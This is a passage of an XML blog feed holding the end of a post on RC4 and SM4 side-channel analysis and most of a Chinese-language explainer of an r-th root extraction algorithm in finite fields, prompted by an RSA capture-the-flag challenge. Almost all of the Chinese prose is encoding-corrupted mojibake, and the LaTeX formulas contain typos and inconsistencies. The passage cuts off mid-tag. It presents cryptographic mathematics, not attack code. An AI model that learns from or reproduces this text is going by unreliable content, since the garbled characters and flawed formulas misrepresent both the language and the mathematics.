</a>æåˆ°çš„å¯¹SM4çš„å·®åˆ†åŠŸè€—æ”»å‡»å¯ä»¥åˆ†åˆ«çŒœæµ‹è½®å¯†é’¥ï¼Œè¿›è€Œæ¢å¤å¯†é’¥ï¼Œ éªŒè¯äº†SM4ç®—æ³•åœ¨é¢ä¸´å·®åˆ†åŠŸè€—æ”»å‡»æ—¶çš„è„†å¼±æ€§ã€‚ä¹Ÿä¸ºSMç®—æ³•çš„è¿›ä¸€æ­¥æ”¹å–„å’Œå®Œå–„æä¾›äº†ä¾æ®ã€‚èƒ½å¤Ÿæœ‰æ•ˆæŠµå¾¡å·®åˆ†åŠŸè€—æ”»å‡»åº”è¯¥æœªæ¥å®‰å…¨åŠ å¯†ç®—æ³•éœ€è¦è€ƒè™‘çš„ä¸€ä¸ªé‡è¦å› ç´ ã€‚</p><h1 id="å‚è€ƒèµ„æ–™ï¼š"><a href="#å‚è€ƒèµ„æ–™ï¼š" class="headerlink" title="å‚è€ƒèµ„æ–™ï¼š"></a>å‚è€ƒèµ„æ–™ï¼š</h1><p> <a href="https://baike.baidu.com/item/RC4/3454548?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/RC4/3454548?fr=aladdin</a> </p><p> <a href="https://zh.wikipedia.org/wiki/RC4" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/RC4</a> </p><p> <a href="https://baike.baidu.com/item/SM4.0/3901780?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/SM4.0/3901780?fr=aladdin</a> </p><p> <a href="https://blog.csdn.net/weixin_37569048/article/details/94983841" target="_blank" rel="noopener">https://blog.csdn.net/weixin_37569048/article/details/94983841</a> </p><p> <a href="https://blog.csdn.net/cg129054036/article/details/83016958" target="_blank" rel="noopener">https://blog.csdn.net/cg129054036/article/details/83016958</a> </p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å°å±‹ </category>
          
          <category> Stream </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rc4 </tag>
            
            <tag> SM4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦å­¦ä¹ ç¬”è®° ä¹‹ æµ…æOn r-th Root Extraction Algorithm in Fq</title>
      <link href="/2019/12/04/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%B5%85%E6%9E%90On%20r-th%20Root%20Extraction%20Algorithm%20in%20Fq/"/>
      <url>/2019/12/04/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%B5%85%E6%9E%90On%20r-th%20Root%20Extraction%20Algorithm%20in%20Fq/</url>
      
        <content type="html"><![CDATA[<p>é¦–å‘äº<a href="https://www.anquanke.com/post/id/194232" target="_blank" rel="noopener">å®‰å…¨å®¢</a></p><h2 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h2><p>åœ¨NCTFä¸Šé‡åˆ°äº†ä¸€é“å‡ºé¢˜äººç”¨æ¥å‹è½´çš„RSAï¼Œä¸æ­£å¸¸RSAåŠ å¯†ä¸åŒçš„æ˜¯ï¼Œæœ¬é¢˜çš„$e$æ˜¯$Ï†(p)$å’Œ$Ï†(q)$çš„ä¸€ä¸ªå› å­ã€‚åœ¨å‡ºé¢˜äººç»™å‡ºhintåï¼Œæˆ‘æ‰¾åˆ°äº†ä¸€ç¯‡paperï¼Œä¾¥å¹¸ç”¨paperä¸­æåˆ°çš„ç®—æ³•æ‹¿åˆ°äº†ä¸€è¡€~</p><p>è¯¥ç®—æ³•å¯ä»¥åœ¨æœ‰é™åŸŸ$F_q$ä¸­å¼€$r$æ¬¡æ ¹ï¼Œä½†éœ€è¦sï¼Œæ»¡è¶³$r^s$æ•´é™¤$q-1$ï¼Œå³$r^s$ | $q-1$ï¼Œå¹¶ä¸”$s$è¦å°ã€‚</p><h2 id="On-r-th-Root-Extraction-Algorithm-in-Fq"><a href="#On-r-th-Root-Extraction-Algorithm-in-Fq" class="headerlink" title="On r-th Root Extraction Algorithm in Fq"></a>On r-th Root Extraction Algorithm in Fq</h2><p><a href="https://eprint.iacr.org/2013/117.pdf" target="_blank" rel="noopener">On r-th Root Extraction Algorithm </a></p><h3 id="å¼•è¨€ï¼š"><a href="#å¼•è¨€ï¼š" class="headerlink" title="å¼•è¨€ï¼š"></a>å¼•è¨€ï¼š</h3><p>æˆ‘ä»¬è®©rä¸ºä¸€ä¸ªå¤§äº1çš„æ•´æ•°ï¼Œé‚£ä¹ˆæœ‰ç°å­˜çš„ä¸¤ç§ç®—æ³•ç”¨æ¥åœ¨æœ‰é™åŸŸFqä¸­å¼€r^sæ¬¡æ ¹ï¼Œ the Adleman-Manders-Miller algorithm å’Œ the Cipolla-Lehmer algorithms</p><p>å‡è®¾$r&lt;&lt;log q$ ï¼Œç”±äº the Adleman-Manders-Miller algorithm è¦æ±‚sæ»¡è¶³$ r^s | q-1 $å¹¶ä¸” $r^{s+1}$ ä¸èƒ½æ•´é™¤ $q-1$ï¼Œæ‰€ä»¥å®ƒçš„æ—¶é—´å¤æ‚åº¦O(logrlog4 q) æ¯” the Cipolla-Lehmer algorithms çš„æ—¶é—´å¤æ‚åº¦$O(rlog_3q)$ è¦é«˜ã€‚ä½†æ˜¯ï¼Œç”±äºCipolla Lehmeréœ€è¦ç¹ççš„æ‰©å±•å­—æ®µç®—æ³•ï¼Œå½“sæ¯”è¾ƒå°æ—¶ï¼Œthe Adleman-Manders-Miller algorithm è¦æ¯”ä¹‹æ›´ä¸ºæœ‰æ•ˆã€‚</p><p>å¦ä¸€æ–¹é¢ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹è¿˜å­˜åœ¨æ¯” Tonelli-Shanks è®¡ç®—æ›´å¿«çš„å…¶ä»–æ–¹æ³•æ¥åšå¼€æ–¹è¿ç®—ã€‚ä¾‹å­å°±æ˜¯å½“ $q\equiv  3 \pmod {4}$.</p><p>$c$æ—¶$F_q$ä¸­çš„äºŒæ¬¡å‰©ä½™æ—¶ï¼Œ$c$çš„å…¶ä¸­ä¸€ä¸ªæ ¹å°±æ˜¯$c^\frac{q+1}{4}$ï¼Œåˆ©ç”¨æ¬§æ‹“å¾ˆå®¹æ˜“è¯æ˜$(c^\frac{q+1}{4})^2 = c$</p><p>å½“$s=2ï¼Œ3$æ—¶ï¼Œä¹Ÿæœ‰ç±»ä¼¼çš„æ–¹æ³•ï¼Œ Atkin , MuÂ¨ller and Kong et al ï¼Œä»–ä»¬çš„æ–¹æ³•åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ è¦æ¯”Tonelli-Shanks and the Cipolla-Lehmer è¡¨ç°å¾—æ›´ä¸ºå‡ºè‰²ã€‚</p><p><img src="https://i.loli.net/2020/04/30/AerdW8NUFjV4iao.png" alt="Tonelli-Shanks and the Cipolla-Lehmer "></p><p>ä½†æ˜¯ä½œè€…è®¤ä¸ºè¿™äº›æ–¹æ³•ä¸èƒ½å¾ˆå¥½çš„è§£å†³æ™®éçš„æƒ…å†µï¼Œæ‰€ä»¥ä½œè€…å±•ç¤ºäº†ä¸€ç§ï¼Œæ–°çš„å¼€æ ¹çš„æ–¹æ³•ï¼Œåªç”¨ä¸€ä¸ªé¢„è®¡ç®—å¥½çš„åŸºå…ƒï¼Œä¸€æ¬¡æŒ‡æ•°è¿ç®—ï¼Œå¹¶ä¸”åœ¨så¾ˆå°çš„æ—¶å€™ååˆ†é«˜æ•ˆã€‚</p><h3 id="å¼€äºŒæ¬¡æ ¹ç®—æ³•ï¼š"><a href="#å¼€äºŒæ¬¡æ ¹ç®—æ³•ï¼š" class="headerlink" title="å¼€äºŒæ¬¡æ ¹ç®—æ³•ï¼š"></a>å¼€äºŒæ¬¡æ ¹ç®—æ³•ï¼š</h3><p>æœ‰ä¸€äº›é«˜æ•ˆçš„å…¬å¼ï¼Œåˆ†åˆ«å½“$ q \equiv  5 \pmod{ 8}$ ï¼Œæˆ–è€… $q \equiv  9 \pmod{ 16}$ ã€‚å¦‚æœ$q \equiv  5 \pmod{ 8}$ï¼Œå±äº $q \equiv  1 \pmod{ 4}$, çš„ä¸€ç§ç‰¹æ®Šæƒ…å†µï¼Œ Atkin æœ‰ä¸€ç§åªè¿›è¡Œä¸€æ¬¡æŒ‡æ•°è¿ç®—çš„é«˜æ•ˆçš„å…¬å¼ã€‚</p><h5 id="Algorithm-1-Atkinâ€™s-algorithm-when-q-equiv-5-pmod-8"><a href="#Algorithm-1-Atkinâ€™s-algorithm-when-q-equiv-5-pmod-8" class="headerlink" title="Algorithm 1 Atkinâ€™s algorithm when $q \equiv  5 \pmod{ 8}$"></a>Algorithm 1 Atkinâ€™s algorithm when $q \equiv  5 \pmod{ 8}$</h5><p>æ–¹ç¨‹ï¼Œ$x^2 = a \pmod{q}$ï¼Œå·²çŸ¥aï¼Œæ±‚x</p><ol><li>$b &lt;== (2a)^\frac{q-5}{8}$</li><li>$i &lt;== 2ab^2$</li><li>$x &lt;==ab(i-1)$</li><li>$return x$</li></ol><h5 id="Algorithm-2-MuÂ¨llerâ€™s-algorithm-when-q-equiv-9-pmod-16"><a href="#Algorithm-2-MuÂ¨llerâ€™s-algorithm-when-q-equiv-9-pmod-16" class="headerlink" title="Algorithm 2 MuÂ¨llerâ€™s algorithm when $q \equiv  9 \pmod{ 16}$"></a>Algorithm 2 MuÂ¨llerâ€™s algorithm when $q \equiv  9 \pmod{ 16}$</h5><p>æ–¹ç¨‹ï¼Œ$x^2 = a \pmod{q}$ï¼Œå·²çŸ¥$a$ï¼Œæ±‚$x$</p><ol><li>$b &lt;== (2a)^\frac{q-1}{4}$</li><li>$Find randomly d satisfying -b = Î·(d)$</li><li>$u &lt;== (2ad^2)^\frac{q-9}{16}$</li><li>$i &lt;== 2u^2d^2a$</li><li>$x &lt;== uda(i-1)$</li><li>$retrun x$</li></ol><p>å…¶ä¸­ç¬¬äºŒæ­¥æœ‰ä¸ªç¥å¥‡çš„ä¸œè¥¿ $Î·(d)$ ï¼Œpaperä¸­ç»™çš„å®šä¹‰æ˜¯</p><p><img src="https://i.loli.net/2020/04/30/YuCydhUnjMKci4t.png" alt="problem"></p><p>ï¼Œç„¶é¹…æƒ³ä¸å‡ºæ€ä¹ˆè®©å®ƒç­‰äº$-b$ï¼Œï¼ˆè¿˜æ±‚å¤§å¸ˆå‚…ä»¬æŒ‡ç‚¹~ï¼‰</p><h3 id="åœ¨æœ‰é™åŸŸä¸­-Fq-å¼€-r-s-æ ¹-q-equiv-lr-s-1-pmod-r-s-1"><a href="#åœ¨æœ‰é™åŸŸä¸­-Fq-å¼€-r-s-æ ¹-q-equiv-lr-s-1-pmod-r-s-1" class="headerlink" title="åœ¨æœ‰é™åŸŸä¸­ Fq å¼€ $r^s$ æ ¹ [ $q \equiv  lr^s + 1 \pmod{ r^{s+1})}$ ]"></a>åœ¨æœ‰é™åŸŸä¸­ Fq å¼€ $r^s$ æ ¹ [ $q \equiv  lr^s + 1 \pmod{ r^{s+1})}$ ]</h3><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦ä¸€ä¸ªè´¨æ•°$q$ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ª$r$ï¼Œæ»¡è¶³$ r | (q-1)$ï¼Œï¼ˆå¦‚æœ$r$ä¸$q-1$äº’è´¨ï¼Œé‚£é—®é¢˜å°±å¾ˆç®€å•äº†ï¼Œ$r$çš„é€†ç”¨æ¬§æ‹“å¾ˆå¿«å°±èƒ½æ‰¾åˆ°ï¼‰ç„¶åä¼šå­˜åœ¨ä¸€ä¸ªsï¼Œsæ˜¯æ»¡è¶³$\frac{q-1}{r^s} \equiv l \pmod{r}$çš„æœ€å¤§çš„æ­£æ•´æ•°</p><p>å³ä¼šæ»¡è¶³$q \equiv lr^s + 1 \pmod{r^{s+1}}$</p><h4 id="å®šç†1ï¼šåœ¨åŸŸFqä¸­ï¼Œç»™å®šä¸€ä¸ªræ¬¡å¹‚cï¼Œå­˜åœ¨ä¸€ä¸ªbï¼Œä½¿å¾—-c-r-1-cdot-b-cdot-r-å…·æœ‰-r-t-é˜¶ï¼Œï¼ˆ-t-lt-s-ï¼‰"><a href="#å®šç†1ï¼šåœ¨åŸŸFqä¸­ï¼Œç»™å®šä¸€ä¸ªræ¬¡å¹‚cï¼Œå­˜åœ¨ä¸€ä¸ªbï¼Œä½¿å¾—-c-r-1-cdot-b-cdot-r-å…·æœ‰-r-t-é˜¶ï¼Œï¼ˆ-t-lt-s-ï¼‰" class="headerlink" title="å®šç†1ï¼šåœ¨åŸŸFqä¸­ï¼Œç»™å®šä¸€ä¸ªræ¬¡å¹‚cï¼Œå­˜åœ¨ä¸€ä¸ªbï¼Œä½¿å¾—$c^{(r-1)\cdot b}\cdot r$ å…·æœ‰$r^t$é˜¶ï¼Œï¼ˆ$t&lt;s$ï¼‰"></a>å®šç†1ï¼šåœ¨åŸŸFqä¸­ï¼Œç»™å®šä¸€ä¸ªræ¬¡å¹‚cï¼Œå­˜åœ¨ä¸€ä¸ªbï¼Œä½¿å¾—$c^{(r-1)\cdot b}\cdot r$ å…·æœ‰$r^t$é˜¶ï¼Œï¼ˆ$t&lt;s$ï¼‰</h4><h5 id="è¯æ˜ï¼š"><a href="#è¯æ˜ï¼š" class="headerlink" title="è¯æ˜ï¼š"></a>è¯æ˜ï¼š</h5><p>æˆ‘ä»¬è®¾ä¸€ä¸ª$l$ï¼Œæ»¡è¶³$gcd(l,r)=1$,é‚£ä¹ˆå­˜åœ¨$Î² (0â‰¤Î²&lt;l)$ï¼Œæ»¡è¶³ $rÎ²+râˆ’1 \equiv  0 \pmod{ l}$å³å­˜åœ¨$Î±$ï¼Œæ»¡è¶³ $rÎ² + râˆ’1 = lÎ±.$</p><p>ç„¶åï¼Œæˆ‘ä»¬è®¾ä¸€ä¸ª $Î¶$ ä¸ºï¼Œ</p><p>$Î¶ = (c^a)^\frac{q-1}{r^2}$</p><p>åˆ™æœ‰</p><p>$Î¶ = (c^a)^\frac{q-1}{r^2}$</p><p> = $(c^a)^\frac{q-1}{r^2}c^{rÎ²+r-1-lÎ±} = c^{r-1}c^{rÎ²}(c^Î±)^\frac{q-1}{r^s}c^{-lÎ±}$</p><p> = $c^{r-1}{c^Î²(c^Î±)^\frac{q-1-lr^s}{r^{s+1}}}^r = c^{r-1}b^r$</p><p>å…¶ä¸­ï¼Œ$b = c^Î²(c^Î±)^\frac{q-1-lr^s}{r^{s+1}}$</p><p>å› ä¸º$c$æ˜¯åŸŸ$F_q$ä¸­çš„$r$æ¬¡å¹‚ï¼Œæ•…$Î¶$æ‹¥æœ‰$r^t$é˜¶ï¼Œ$(0â‰¤t&lt;s) $ï¼ˆä¸ºå•¥è¿™é‡Œ$t$å°±å°äº$s$äº†ï¼Œæ±‚æŒ‡ç‚¹~ï¼‰</p><h5 id="åˆ©ç”¨ï¼š"><a href="#åˆ©ç”¨ï¼š" class="headerlink" title="åˆ©ç”¨ï¼š"></a>åˆ©ç”¨ï¼š</h5><p>åœ¨åŸŸ$F_q$ä¸­ï¼Œæˆ‘ä»¬ä»¤ $Î¾ $ä¸º ä¸€ä¸ª$r^2$é˜¶æœ¬åŸå•ä½æ ¹ï¼Œ$Î¾$å¯ä»¥é€šè¿‡å…¬å¼$Î¾ = d^\frac{q-1}{r^s}$</p><p>è®¡ç®—å¾—åˆ°ï¼Œå…¶ä¸­$d$ä¸ºåŸŸ$F_q$ä¸­çš„é$r$æ¬¡å¹‚ï¼Œè¿™æ ·çš„$d$å¯ä»¥éšæœºé€‰å–ï¼Œåœ¨åŸŸ$F_q$ä¸­æ‰¾åˆ°å®ƒçš„æ¦‚ç‡ä¸º$\frac{r-1}{r}$</p><p>ç”±æ­¤ï¼Œæˆ‘ä»¬è®¾$Î¾^{r^{s-t}}$ä¸€ä¸ª$r^t$é˜¶çš„æœ¬åŸå•ä½æ ¹ï¼Œåˆ™å­˜åœ¨ä¸€å¯¹å”¯ä¸€ç¡®å®šçš„$iï¼Œj$æ»¡è¶³</p><p>$Î¾^{r^{s-t}} = Î¶^i, Î¶ = (Î¾^{r^{s-t}})^j$</p><p>å› ä¸º$Î¶ = (Î¾^{r^{s-t}})^j = Î¶^{ij}$, æ‰€ä»¥æˆ‘ä»¬æœ‰ $ij \equiv 1 \pmod{r^t}$</p><p>ç”±æ­¤æˆ‘ä»¬å°†å±•ç°ä¸€ä¸ªæ–°çš„å®šç†ï¼Œåœ¨åˆé€‚çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ç”¨ä¸€æ¬¡æŒ‡æ•°è¿ç®—å¯ä»¥æ‰¾åˆ°$r$æ¬¡å‰©ä½™çš„ä¸€ä¸ª$r$æ¬¡æ ¹ï¼Œ</p><h4 id="å®šç†2ï¼šå®šä¹‰-u-equiv-jÂ·-r-t-âˆ’1-Â·r-sâˆ’tâˆ’1-equiv-âˆ’jr-sâˆ’tâˆ’1-pmod-r-sâˆ’1-é‚£ä¹ˆåœ¨åŸŸ-F-q-ä¸­-c-çš„ä¸€ä¸ª-r-æ¬¡æ ¹ä¸º-cbÎ¾-u-ï¼Œå…¶ä¸­-b-åœ¨å®šç†1ä¸­ç»™å‡ºã€‚"><a href="#å®šç†2ï¼šå®šä¹‰-u-equiv-jÂ·-r-t-âˆ’1-Â·r-sâˆ’tâˆ’1-equiv-âˆ’jr-sâˆ’tâˆ’1-pmod-r-sâˆ’1-é‚£ä¹ˆåœ¨åŸŸ-F-q-ä¸­-c-çš„ä¸€ä¸ª-r-æ¬¡æ ¹ä¸º-cbÎ¾-u-ï¼Œå…¶ä¸­-b-åœ¨å®šç†1ä¸­ç»™å‡ºã€‚" class="headerlink" title="å®šç†2ï¼šå®šä¹‰$u \equiv  jÂ·(r^t âˆ’1)Â·r^{sâˆ’tâˆ’1} \equiv âˆ’jr^{sâˆ’tâˆ’1} \pmod{ r^{sâˆ’1}}$. é‚£ä¹ˆåœ¨åŸŸ$F_q$ä¸­$c$çš„ä¸€ä¸ª$r$æ¬¡æ ¹ä¸º $cbÎ¾^u$ ï¼Œå…¶ä¸­$b$åœ¨å®šç†1ä¸­ç»™å‡ºã€‚"></a>å®šç†2ï¼šå®šä¹‰$u \equiv  jÂ·(r^t âˆ’1)Â·r^{sâˆ’tâˆ’1} \equiv âˆ’jr^{sâˆ’tâˆ’1} \pmod{ r^{sâˆ’1}}$. é‚£ä¹ˆåœ¨åŸŸ$F_q$ä¸­$c$çš„ä¸€ä¸ª$r$æ¬¡æ ¹ä¸º $cbÎ¾^u$ ï¼Œå…¶ä¸­$b$åœ¨å®šç†1ä¸­ç»™å‡ºã€‚</h4><h5 id="è¯æ˜ï¼š-1"><a href="#è¯æ˜ï¼š-1" class="headerlink" title="è¯æ˜ï¼š"></a>è¯æ˜ï¼š</h5><p><img src="https://i.loli.net/2020/04/30/FqjtHNywcsbEBp3.png" alt="2"></p><p>(ç”±äº $Î¾ = d^\frac{q-1}{r^s}$ ,ç”±è´¹é©¬å°å®šç†ï¼Œåœ¨$F_q$ä¸­ $Î¾^{r^s} = 1 $æ˜“è¯ )</p><p>è¯æ¯•ã€‚</p><p>æ³¨1ï¼š $ rÎ² + r âˆ’1 = lÎ±$å³ $r(Î² + l) + r âˆ’1 = l(Î± + r)$ã€‚è¿™è¯´æ˜ï¼Œ$Î± \pmod{r}  ï¼‰$æ˜¯ç¡®å®šçš„ï¼Œ$Î²\pmod{l}$æ˜¯ç¡®å®šçš„ï¼Œæ‰€ä»¥å¯¹äºä»»æ„çš„Î± æ»¡è¶³$Î±^\frac{q-1}{r^s}\equiv Î±l \equiv -1 \pmod{r}$,éƒ½æœ‰å”¯ä¸€ç¡®å®šçš„Î²æ»¡è¶³$rÎ² +r -1 = lÎ± (i.e., Î² = \frac{lÎ±+1-r}{r})$ã€‚ä½œè€…åœ¨è¿™é‡Œè¿˜åŠ äº†ä¸€å¥ï¼Œäº‹å®ä¸Šï¼Œæ¡ä»¶$rÎ² + râˆ’1âˆ’lÎ± = 0$ å¯ä»¥è½¬åŒ–ä¸º $rÎ² + râˆ’1âˆ’lÎ± \equiv  0 \pmod{ \frac{q-1}{r} }$å› ä¸º$c^\frac{q-1}{r}\equiv 1$ï¼ˆéš¾é“æ˜¯æ¬§æ‹‰åˆ¤åˆ«å®šç†çš„æ¨å¹¿ï¼Ÿï¼‰</p><p>æ³¨2ï¼šcbçš„å€¼å¯ä»¥åŒ–æˆ</p><p><img src="https://i.loli.net/2020/04/30/hMW1s87FiGQRC6g.png" alt="cb"></p><p>å…¶ä¸­$Î±$æ˜¯ä¸€ä¸ªæ•´æ•°$ï¼ˆ0&lt;Î±&lt;rï¼‰$ï¼Œæ»¡è¶³$1+Î±^\frac{q-1}{r^s}\equiv 0 \pmod{r}$æ‰€ä»¥bä¹Ÿå¯ä»¥è¡¨ç¤ºä¸º</p><p>$b = cb/c = c^\frac{l+a^\frac{q-1}{r^s}-r}{r}$</p><p>æ³¨3ï¼šå¯¹äº $ij \equiv  1 \pmod{ r^t}$ ï¼Œå½“$r^t$å¾ˆå¤§ï¼ˆ$t&gt;1$ å¹¶ä¸”åœ¨$r^t$é˜¶å¾ªç¯ç¾¤ä¸­çš„ç¦»æ•£å¯¹æ•°å¾ˆéš¾å¤„ç†ï¼‰æ—¶ï¼Œå…¶ä¸­çš„$i$å’Œ$j$æ‰¾èµ·æ¥æ˜¯æ¯”è¾ƒå›°éš¾çš„ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•é€‚åˆåœ¨$r$å’Œ$t$éƒ½æ¯”è¾ƒå°çš„æ—¶å€™ï¼Œä¹Ÿå¯ä»¥è¢«è§†ä½œæ˜¯å¦ä¸€ä¸ªç‰ˆæœ¬çš„Adleman-Manders-Miller algorithmã€‚</p><h4 id="ä¸¾ä¾‹ä¸ç®—æ³•"><a href="#ä¸¾ä¾‹ä¸ç®—æ³•" class="headerlink" title="ä¸¾ä¾‹ä¸ç®—æ³•"></a>ä¸¾ä¾‹ä¸ç®—æ³•</h4><p>ç»ˆäºåˆ°å®ä¾‹ç¯èŠ‚äº†~</p><h5 id="ä¾‹1-q-equiv-lr-1-pmod-r-2-0-lt-l-lt-r"><a href="#ä¾‹1-q-equiv-lr-1-pmod-r-2-0-lt-l-lt-r" class="headerlink" title="ä¾‹1 $q \equiv  lr + 1 \pmod{ r^2} 0 &lt; l &lt; r$:"></a>ä¾‹1 $q \equiv  lr + 1 \pmod{ r^2} 0 &lt; l &lt; r$:</h5><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ$s=1$,æ‰€ä»¥$t=u=0$ï¼Œæ‰€ä»¥$r$æ¬¡æ ¹$c$å¯ä»¥è¡¨ç¤ºä¸º$cbÎ¾^u = cb = c^\frac{l+a^\frac{q-1}{r^s}}{r}$</p><p>å…¶ä¸­Î±éœ€è¦æ»¡è¶³$1+a^\frac{q-1}{r}\equiv 0\pmod {r}$ å½“$r = 2ï¼Œs=1$å°±æ„å‘³ç€ï¼Œ$ q \equiv  3 \pmod{ 4}$ ï¼Œ$Î±$åœ¨è¿™é‡Œå¯ä»¥ç®—å‡ºæ˜¯1ï¼Œå¸¦å…¥å…¬å¼ï¼Œ$c$çš„ä¸€ä¸ªäºŒæ¬¡æ ¹å°±æ˜¯ä¼—æ‰€å‘¨çŸ¥çš„$c^\frac{p+1}{4}$ï¼Œï¼ˆRabinè§£å¯†~ï¼‰</p><p>å½“$r = 3ï¼Œs=1$ å°±æ„å‘³ç€ $q \equiv  4 \pmod{ 9}$ æˆ–è€… $q \equiv  7 \pmod{ 9}$ï¼Œå…ˆç®—å‡º$Î±$ï¼Œç„¶åå¸¦å…¥å…¬å¼</p><p>$c^\frac{1+2\frac{q-1}{3}}{3}= c^\frac{2q+1}{9}$ï¼Œï¼ˆ$å½“ q \equiv  4 \pmod{ 9}$) æˆ–æ˜¯$c^\frac{1+1^\frac{q-3}{3}}{3} = c^\frac{q+2}{9} $ï¼ˆå½“ $q \equiv  7 \pmod{ 9}$)</p><p>è¿™é‡Œæœ‰ä¸ªè¡¨<img src="https://i.loli.net/2020/04/30/s4nvIGrOZeBEafo.png" alt="table"></p><p>æœ€åº•ä¸‹ä¸€æ ·æœ‰ä¾‹å¤–ï¼Œæ­¤æ—¶ä¹Ÿå°±ä»¥ä¸ºç€$r=0ï¼Œr=0.$è¿˜æœ‰å•¥æ ¹å¯å¼€~</p><p>å¯è§ï¼Œå½“$s=1$æ—¶ï¼Œåœ¨ $q \equiv  1 \pmod{ r}$ å¹¶ä¸” $q !\equiv  1 \pmod{ r^2}$ æ—¶ï¼Œå³$q$çš„$(r-1) $ç§æƒ…å†µéƒ½å¯ä»¥å€Ÿè¯¥å…¬å¼è¿›è¡Œä¸€æ¬¡æŒ‡æ•°è¿ç®—å°±å¯å¼€æ ¹ï¼Œå¾—åˆ°ä¸€ä¸ªè§£ã€‚ï¼ˆæ¨ç†è¿‡ç¨‹ä¸€çŸ¥åŠè§£çš„ï¼Œä½†æ˜¯ç»“è®ºç”¨èµ·æ¥æ˜¯çœŸçš„é¦™ï¼‰</p><h5 id="ä¾‹2-q-equiv-lr-2-1-pmod-r-3-0-lt-l-lt-r"><a href="#ä¾‹2-q-equiv-lr-2-1-pmod-r-3-0-lt-l-lt-r" class="headerlink" title="ä¾‹2 $q \equiv  lr^2 + 1 \pmod{ r^3} 0 &lt; l &lt; r$:"></a>ä¾‹2 $q \equiv  lr^2 + 1 \pmod{ r^3} 0 &lt; l &lt; r$:</h5><p>å½“$s=2$.é‚£ä¹ˆ$Î¶ = (c^Î±)^\frac{q-1}{r^2}=1$)æˆ–è€… æ˜¯ä¸€ä¸ª$r$é˜¶æœ¬åŸå•ä½æ ¹ ï¼ˆ$Î¶$æ˜¯$r^t$é˜¶ï¼Œ$t$=0 or 1ï¼‰ï¼ŒåŒæ—¶$Î¾$ä¹Ÿæ˜¯ä¸€ä¸ª$r^2$é˜¶çš„æœ¬åŸå•ä½æ ¹ï¼ˆåŸæ ¹ï¼‰æ»¡è¶³ï¼š$Î¾^{r^2-t} = Î¶^i å³ (Î¾^{r^2-t})^j =Î¶ $   with $ij\equiv 1 \pmod{r^t}$</p><p>å› æ­¤ï¼Œ$r$æ¬¡æ ¹å¯ä»¥è¡¨ç¤ºä¸º $cbÎ¾^u$ ï¼Œå…·ä½“çš„å€¼ä¸Šæ–‡å·²ç»™ï¼Œå½“$t=0ï¼Œu=0ï¼Œx=cb$æ˜¯ä¸€ä¸ª$r$æ¬¡æ ¹ï¼Œå½“$t=1,u \equiv âˆ’j \pmod{ r}$ ï¼Œ$x= cbÎ¾^{âˆ’j}$æ˜¯ä¸€ä¸ª$r$æ¬¡æ ¹ã€‚ï¼ˆæ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯å¸Œæœ›$t=0$ï¼Œè¿™æ ·è®¡ç®—å°±ä¼šæå…¶æ–¹ä¾¿~ï¼‰</p><h6 id="Algorithm-3-Our-cube-root-algorithm-when-q-equiv-1-pmod-9-and-q-Ì¸-equiv-1-pmod-27"><a href="#Algorithm-3-Our-cube-root-algorithm-when-q-equiv-1-pmod-9-and-q-Ì¸-equiv-1-pmod-27" class="headerlink" title="Algorithm 3 Our cube root algorithm when $q \equiv  1 \pmod{ 9}$ and $q Ì¸\equiv  1 \pmod{ 27}$"></a>Algorithm 3 Our cube root algorithm when $q \equiv  1 \pmod{ 9}$ and $q Ì¸\equiv  1 \pmod{ 27}$</h6><p>$x^3\equiv c \pmod{ q}$ $ (q = 9l + 1 \pmod{ 27}$ with  $ l = 1,2, i.e.$, $q \equiv  10,19 \pmod{ 27}$</p><p><img src="https://i.loli.net/2020/04/30/QYibS8IanCMRBjP.png" alt="Our cube root algorithm"></p><p>è§£è¯»ä¸€ä¸‹ï¼š$Î¾ = d^\frac{q-1}{r^s}$ï¼Œå…¶ä¸­$d$åœ¨åŸŸ$F_q$ç§ä¸æ˜¯ä¸€ä¸ª$r$æ¬¡å¹‚ï¼ˆéå†ä¸€ä¸‹ï¼Œéšä¾¿å–ä¸€ä¸ªå°±å¥½ï¼‰ã€‚</p><p>$Î¶=c^{râˆ’1Â·b}r = c^{2Â·b}3=X^{2b}$</p><p>å¦‚æœï¼Œ$Î¶=1$ï¼Œåˆ™è¯´æ˜$t=0$ï¼Œé‚£ä¹ˆ$x=cb=X$</p><p>å¦‚æœï¼Œ$Î¶=B=Î¾^r$ï¼Œé‚£ä¹ˆ$t=j=1$,$x=cbÎ¾^{-j}=cbÎ¾^2=XA^2$</p><p>å¦åˆ™ï¼Œ$j=2,x=cbÎ¾^{-j}=cbÎ¾^{-2}=XA$</p><p>éªŒè¯ï¼š</p><p><img src="https://i.loli.net/2020/04/30/DJIlwucFAOGNSCP.png" alt="check"></p><p>æˆåŠŸ~</p><p>ä»¥ä¸‹åŒ</p><h6 id="Algorithm-4-Our-5-th-root-algorithm-when-q-equiv-1-pmod-25-and-q-equiv-1-pmod-125"><a href="#Algorithm-4-Our-5-th-root-algorithm-when-q-equiv-1-pmod-25-and-q-equiv-1-pmod-125" class="headerlink" title="Algorithm 4 Our 5-th root algorithm when $q \equiv  1 \pmod{ 25}$and$ q \equiv  1 \pmod{ 125}$"></a>Algorithm 4 Our 5-th root algorithm when $q \equiv  1 \pmod{ 25}$and$ q \equiv  1 \pmod{ 125}$</h6><p>$x^5=c \pmod{ q}$($q \equiv  25l + 1 \pmod{ 125}$with$ l = 1,2,3,4, $i.e., $q \equiv  26,51,76,101 \pmod{ 125}$)</p><p><img 